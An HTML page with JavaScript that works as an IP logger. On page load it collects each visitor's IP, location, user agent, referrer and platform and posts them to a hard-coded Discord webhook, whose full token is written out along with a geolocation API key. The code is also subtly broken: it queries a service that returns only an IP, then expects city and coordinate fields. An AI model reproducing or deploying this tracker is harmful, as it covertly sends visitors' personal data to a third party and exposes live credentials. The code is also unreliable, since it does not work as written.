<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title>Logger & Géolocalisation IP + Discord Webhook</title>
  <style>
    body { font-family: Arial, sans-serif; margin: 2em; }
    img { margin-top: 1em; border: 1px solid #ccc; }
    .info { margin-bottom: 1em; }
  </style>
</head>
<body>
  <h2>Informations de connexion & Carte IP</h2>
  <div id="result"></div>
  <script>
    // Webhook Discord (remplace par le tien si besoin)
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1377390162979586200/L1rq4N6vDSP8alDZhv9vAfxzZ97CXCUIS8OYxl_bniGVp3Fm80eVHbyGk3AExZc_VuWS";

    // Récupère les infos IP via ipwho.is
    async function getIPData() {
      try {
        const res = await fetch('https://api64.ipify.org/?format=json');
        return await res.json();
      } catch {
        return null;
      }
    }

    // Récupère des infos supplémentaires (navigateur, etc.)
    function getClientInfo() {
      return {
        referer: document.referrer || 'unknown',
        user_agent: navigator.userAgent || 'unknown',
        url: window.location.href,
        path: window.location.pathname,
        search: window.location.search,
        method: 'GET',
        hostname: window.location.hostname,
        language: navigator.language,
        platform: navigator.platform,
        cookies_enabled: navigator.cookieEnabled
      };
    }

    // Génère l'URL de la carte statique
    function getMapImageURLip(ip) {
      return `https://api.geoapify.com/v1/ipinfo?ip=${ip}&apiKey=225ecbbf50c7433ba647097eeddf3f9b`;
      }



    
    function getMapImageURL(lat, lon) {
      return `https://maps.geoapify.com/v1/staticmap?style=osm-bright-smooth&width=600&height=400&center=lonlat:${lon},${lat}&zoom=14&apiKey=225ecbbf50c7433ba647097eeddf3f9b`;
    }

    // Envoie toutes les infos au webhook Discord
    async function sendToDiscord(ipData, mapImageURL, clientInfo) {
      const payload = {
        username: "Logger IP & Géolocalisation",
        embeds: [{
          title: "Nouvelle visite détectée",
          description: 
            `**IP**: ${ipData.ip}\n` +
            `**Ville**: ${ipData.city}\n` +
            `**Région**: ${ipData.region}\n` +
            `**Pays**: ${ipData.country}\n` +
            `**Coordonnées**: ${ipData.latitude},${ipData.longitude}\n` +
            `**User-Agent**: ${clientInfo.user_agent}\n` +
            `**URL**: ${clientInfo.url}\n` +
            `**Referer**: ${clientInfo.referer}\n` +
            `**Langue**: ${clientInfo.language}\n` +
            `**Plateforme**: ${clientInfo.platform}\n` +
            `**Cookies activés**: ${clientInfo.cookies_enabled}`,
          image: { url: mapImageURL },
          timestamp: new Date().toISOString()
        }]
      };
      await fetch(WEBHOOK_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
      });
    }

    // Affiche les infos sur la page
    function displayInfo(ipData, mapImageURL) {
      document.getElementById("result").innerHTML = `
        <div class="info">
          <p><strong>IP :</strong> ${ipData.ip}</p>
          <p><strong>Ville :</strong> ${ipData.city}</p>
          <p><strong>Région :</strong> ${ipData.region}</p>
          <p><strong>Pays :</strong> ${ipData.country}</p>
          <p><strong>Latitude, Longitude :</strong> ${ipData.latitude}, ${ipData.longitude}</p>
        </div>
        <img src="${mapImageURL}" alt="Carte de la localisation">
      `;
    }

    // Routine principale
    (async function main() {
      const ipData = await getIPData();
      if (!ipData || !ipData.success) {
        document.getElementById("result").innerHTML = "<p>Impossible de récupérer les informations IP.</p>";
        return;
      }
      console.log(ipData)
      const mapImageURL = getMapImageURL(ipData.latitude, ipData.longitude);
      const clientInfo = getClientInfo();

      displayInfo(ipData, mapImageURL);
      sendToDiscord(ipData, mapImageURL, clientInfo);
    })();
  </script>
</body>
</html>
